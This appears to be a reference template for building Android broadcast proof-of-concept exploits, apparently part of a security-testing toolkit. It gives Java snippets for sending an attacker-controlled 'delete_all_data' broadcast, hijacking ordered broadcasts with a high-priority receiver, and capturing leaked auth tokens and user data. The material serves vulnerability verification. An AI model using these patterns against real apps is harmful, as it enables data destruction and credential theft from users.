---
name: poc-app-broadcast
description: Broadcast PoC reference covering dynamic receiver abuse, ordered-broadcast hijack, permission bypass, and global broadcast leakage.
---

# Broadcast PoC Reference

Use this reference for attacker-controlled or attacker-observable broadcast flows. Broadcast PoCs usually fit `direct-trigger` or `interception` shapes.

## Contents

- [Template Wiring](#template-wiring)
- [Construction Matrix](#construction-matrix)
- [Shared Inputs](#shared-inputs)
- [Pattern 1 - Direct Broadcast Send](#pattern-1---direct-broadcast-send)
- [Pattern 2 - Ordered-Broadcast Interception](#pattern-2---ordered-broadcast-interception)
- [Pattern 3 - Broadcast Leak Listener](#pattern-3---broadcast-leak-listener)
- [Construction Notes](#construction-notes)

## Template Wiring

These snippets show the execution body shape. In the current template:

- keep the body inside a helper method or lambda
- register one exploit id in `ExploitRegistry`
- add a Manifest receiver only when runtime registration is not enough

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| dynamic receiver abuse | `direct-trigger` | none | receiver accepts attacker command |
| ordered hijack | `interception` | runtime receiver | result is modified or broadcast is aborted |
| permission bypass | `direct-trigger` | manifest permission declaration | protected broadcast still sends or lands |
| global leak | `interception` | runtime receiver | sensitive extras are captured |

## Shared Inputs

- real broadcast action
- required extras, categories, permission, or ordered-result shape
- whether the PoC proves direct send or interception
- visible success signal

## Pattern 1 - Direct Broadcast Send

Use for dynamic receiver abuse and many permission-bypass cases.

```java
private static void runBroadcastDynamicAbuse(Context context) {
    Intent intent = new Intent("com.target.INTERNAL_ACTION");
    intent.putExtra("command", "delete_all_data");
    intent.putExtra("confirm", true);
    context.sendBroadcast(intent);
    Log.i("PoC", "Sent attacker-controlled broadcast to com.target.INTERNAL_ACTION");
}
```

Registration shape:

```java
static {
    register("broadcast-send", "Send Broadcast", () -> runBroadcastDynamicAbuse(appContext));
}
```

Fill with:

- real action string
- exact extras or permission values required by the verified finding

Use when:

- the verified finding is about a receiver trusting attacker-supplied action strings or extras

## Pattern 2 - Ordered-Broadcast Interception

Use for ordered-broadcast hijack or modification.

```java
private static void runOrderedBroadcastHijack(Context context) {
    IntentFilter filter = new IntentFilter("com.target.ORDERED_ACTION");
    filter.setPriority(999);

    BroadcastReceiver interceptor = new BroadcastReceiver() {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            Log.i("PoC", "Intercepted ordered broadcast");
            setResultData("tampered_result");
        }
    };

    context.registerReceiver(interceptor, filter, Context.RECEIVER_EXPORTED);
    context.sendOrderedBroadcast(new Intent("com.target.ORDERED_ACTION"), null);
}
```

Registration shape:

```java
static {
    register("broadcast-ordered", "Hijack Ordered Broadcast", () -> runOrderedBroadcastHijack(appContext));
}
```

Success signal:

- modified result reaches the next receiver, or
- the ordered flow is aborted

## Pattern 3 - Broadcast Leak Listener

Use for global broadcast leaks.

```java
private static void runBroadcastLeakCapture(Context context) {
    IntentFilter filter = new IntentFilter("com.target.SENSITIVE_DATA_ACTION");
    BroadcastReceiver listener = new BroadcastReceiver() {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            Log.i("PoC", "Leaked token: " + intent.getStringExtra("auth_token"));
            Log.i("PoC", "Leaked user data: " + intent.getStringExtra("user_data"));
        }
    };

    context.registerReceiver(listener, filter, Context.RECEIVER_EXPORTED);
    Log.i("PoC", "Registered broadcast listener and waiting for target broadcast");
}
```

Registration shape:

```java
static {
    register("broadcast-listen", "Listen For Broadcast Leak", () -> runBroadcastLeakCapture(appContext));
}
```

Manifest notes:

- declare the target custom permission only for permission-bypass cases where `protectionLevel` is attacker-obtainable
- do not declare unnecessary receiver components if a runtime receiver already demonstrates the finding

## Construction Notes

- prefer a direct send helper when the receiver bug is already proven by one attacker-controlled broadcast
- use interception only when the verified finding depends on priority, ordered-result tampering, or passive leak capture
- keep helper receivers minimal and scoped to the exact action, permission, and category required by the target flow
